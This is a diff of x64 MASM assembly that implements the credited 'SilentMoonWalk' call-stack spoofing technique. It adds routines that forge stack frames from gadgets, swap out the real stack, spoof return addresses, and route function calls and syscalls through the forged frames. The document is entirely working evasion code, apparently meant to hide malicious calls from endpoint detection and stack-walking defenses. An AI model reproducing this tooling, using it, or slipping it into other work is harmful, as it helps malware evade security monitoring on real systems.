@@ -1,9 +1,22 @@
 ; Great portions of the asm code below has been obtained from https://github.com/klezVirus.
-; All credits to @KlezVirus @trickster012 @waldoirc and @namazso for developing the original PoC of this technique.
+; All credits to @KlezVirus @trickster012 @waldoirc and @namazso for developing the original PoC of the SilentMoonWalk technique.
 .data
+
+INFO_STRUCT STRUCT
+	RtlAddr							DQ 1
+	RtlSize							DQ 1
+	BaseAddr						DQ 1
+	BaseSize						DQ 1
+	CurrentSize						DQ 1
+	TotalSize						DQ 1
+INFO_STRUCT ENDS
 
 SPOOFER STRUCT
 
+	GodGadget						DQ 1
+	RtlUnwindAddress				DQ 1
+	RtlUnwindTarget					DQ 1
+	Stub                           	DQ 1
     FirstFrameFunctionPointer       DQ 1
     SecondFrameFunctionPointer      DQ 1
     JmpRbxGadget                    DQ 1
@@ -32,7 +45,7 @@ SPOOFER STRUCT
     Arg10                           DQ 1
     Arg11                           DQ 1
 
-    Sys                           DD 0
+    Sys                           	DD 0
     SysId                           DD 0
 
 SPOOFER ENDS
@@ -40,49 +53,153 @@ SPOOFER ENDS
 .code
 
 get_current_rsp proc
-	mov rax, rsp
-	add rax, 8
+	mov 	rax, rsp
+	add 	rax, 8
 	ret
 get_current_rsp endp
 
+get_current_function_address proc
+	mov 	rax, [rsp]
+	ret
+get_current_function_address endp
+
+start_replacement proc
+	mov 	rax, [rsp]
+	mov		r11, rsp
+
+	add		r11, 8 ; we discard current return address to get the original rsp address
+	push 	rsp
+	push 	rbp
+	push	0
+	push	0
+
+	sub 	rsp, [rcx].INFO_STRUCT.RtlSize
+	push	[rcx].INFO_STRUCT.RtlAddr
+	sub 	rsp, [rcx].INFO_STRUCT.BaseSize
+	push	[rcx].INFO_STRUCT.BaseAddr
+	sub		rsp,[rcx].INFO_STRUCT.CurrentSize
+
+	mov		r15, rbp
+	sub		r15, r11
+	mov		r12, rsp
+	add		r15, r12
+	mov		rbp, r15
+
+prepare_loop:
+	mov		r9, 0 ; offset 
+start_loop_1:
+	mov		r8, r11 ; original rsp
+	mov		r12, rsp ; current rsp
+	add		r8, r9
+	add		r12, r9
+	mov		r10, [r8]
+	mov		[r12], r10
+	add		r9, 8
+	cmp		r9, [rcx].INFO_STRUCT.CurrentSize
+	je		end_loop_1
+	jmp		start_loop_1
+
+end_loop_1:
+	jmp		qword ptr rax
+start_replacement endp
+
+end_replacement proc
+	pop		r14
+	mov		r11, rsp ; original rsp
+	mov		r12, [rcx].INFO_STRUCT.TotalSize
+	add 	rsp, r12
+	pop 	rbp
+	pop		rsp
+	pop		r13
+
+	mov		r9, 0 ; offset 
+start_loop_2:
+	mov		r8, r11 ; original rsp
+	mov		r12, rsp ; current rsp
+	add		r8, r9
+	add		r12, r9
+	mov		r10, [r8]
+	mov		[r12], r10
+	add		r9, 8
+	cmp		r9, [rcx].INFO_STRUCT.CurrentSize
+	je		end_loop_2
+	jmp		start_loop_2
+
+end_loop_2:
+	jmp		qword ptr r14
+end_replacement endp 
+
+spoof_call2 proc
+
+	mov		rax, [rsp]
+	mov		r10, [rcx].SPOOFER.ReturnAddress
+	mov		[rsp], r10 
+	mov		[rsp+08h], rbp 
+	mov		[rsp+10h], rbx
+	mov		[rsp+18h], rax
+	mov		rbp, rsp
+
+	lea		rax, restore2
+	push	rax
+
+	lea		rbx, [rsp]
+	add		rsp, 8
+
+	sub		rsp, [rcx].SPOOFER.JmpRbxGadgetFrameSize
+	push	[rcx].SPOOFER.JmpRbxGadget
+	sub		rsp, [rcx].SPOOFER.AddRspXGadgetFrameSize
+	push	[rcx].SPOOFER.AddRspXGadget
+
+	mov		r11, [rcx].SPOOFER.SpoofFunctionPointer
+	jmp		parameter_handler
+spoof_call2 endp
+
 spoof_call proc
 
-	mov     [rsp+08h], rbp
-	mov     [rsp+10h], rbx
-	mov     rbp, rsp
+	mov		[rsp+08h], rbp
+	mov		[rsp+10h], rbx
+	mov		rbp, rsp
 
-	lea     rax, restore
-	push    rax
+	lea		rax, restore
+	push	rax
 
-	lea     rbx, [rsp]
+	lea		rbx, [rsp]
 
-	push    [rcx].SPOOFER.FirstFrameFunctionPointer                                     
+	push	[rcx].SPOOFER.FirstFrameFunctionPointer                                     
 	
-	mov     rax, [rcx].SPOOFER.ReturnAddress
-	sub     rax, [rcx].SPOOFER.FirstFrameSize
+	mov		rax, [rcx].SPOOFER.ReturnAddress
+	sub		rax, [rcx].SPOOFER.FirstFrameSize
 	
-	sub     rsp, [rcx].SPOOFER.SecondFrameSize
-	mov     r10, [rcx].SPOOFER.StackOffsetWhereRbpIsPushed
-	mov     [rsp+r10], rax 
+	sub		rsp, [rcx].SPOOFER.SecondFrameSize
+	mov		r10, [rcx].SPOOFER.StackOffsetWhereRbpIsPushed
+	mov		[rsp+r10], rax 
 
-	push    [rcx].SPOOFER.SecondFrameFunctionPointer
+	push	[rcx].SPOOFER.SecondFrameFunctionPointer
 
-	sub     rsp, [rcx].SPOOFER.JmpRbxGadgetFrameSize
-	push    [rcx].SPOOFER.JmpRbxGadget
-	sub     rsp, [rcx].SPOOFER.AddRspXGadgetFrameSize
+	sub		rsp, [rcx].SPOOFER.JmpRbxGadgetFrameSize
+	push	[rcx].SPOOFER.JmpRbxGadget
+	sub		rsp, [rcx].SPOOFER.AddRspXGadgetFrameSize
+	push	[rcx].SPOOFER.AddRspXGadget
 
-	push    [rcx].SPOOFER.AddRspXGadget
-
-	mov     r11, [rcx].SPOOFER.SpoofFunctionPointer
-	jmp     parameter_handler
+	mov		r11, [rcx].SPOOFER.SpoofFunctionPointer
+	jmp		parameter_handler
 spoof_call endp
 	
 restore proc
-	mov     rsp, rbp
-	mov     rbp, [rsp+08h]
-	mov     rbx, [rsp+10h]
+	mov		rsp, rbp
+	mov		rbp, [rsp+08h]
+	mov		rbx, [rsp+10h]
 	ret
 restore endp
+
+restore2 proc
+	mov		rsp, rbp
+	mov		rbp, [rsp+18h]
+	mov		[rsp], rbp
+	mov		rbp, [rsp+08h]
+	mov		rbx, [rsp+10h]
+	ret
+restore2 endp
 
 parameter_handler proc
 	cmp		[rcx].SPOOFER.Nargs, 11
@@ -106,9 +223,9 @@ parameter_handler proc
 	cmp		[rcx].SPOOFER.Nargs, 2
 	je		handle_two
 	cmp		[rcx].SPOOFER.Nargs, 1
-	je 		handle_one
+	je		handle_one
 	cmp		[rcx].SPOOFER.Nargs, 0
-	je 		handle_none
+	je		handle_none
 parameter_handler endp
 
 handle_eleven proc
@@ -184,7 +301,7 @@ handle_none proc
 handle_none endp
 
 execute proc
-	jmp     qword ptr r11
+	jmp		qword ptr r11
 execute endp
 
 execute_syscall proc
